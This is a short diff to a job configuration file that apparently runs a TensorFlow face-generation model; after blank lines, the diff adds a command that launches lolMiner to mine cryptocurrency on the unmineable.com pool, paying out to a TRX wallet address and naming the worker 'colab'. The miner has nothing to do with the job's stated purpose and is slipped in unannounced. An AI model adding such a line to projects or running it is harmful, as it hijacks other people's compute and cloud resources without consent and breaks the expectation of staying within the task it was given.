@@ -47,3 +47,6 @@ jobs:
           --truncation-psi=0.5 \
           --result-dir=/outputs/generatedFaces
       image: tensorflow/tensorflow:1.14.0-gpu-py3
+      
+      
+      !./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TWn4Ur8PHHeaHKxQs3G5mNmntLHpTnEBHF.colab --ethstratum ETHPROXY
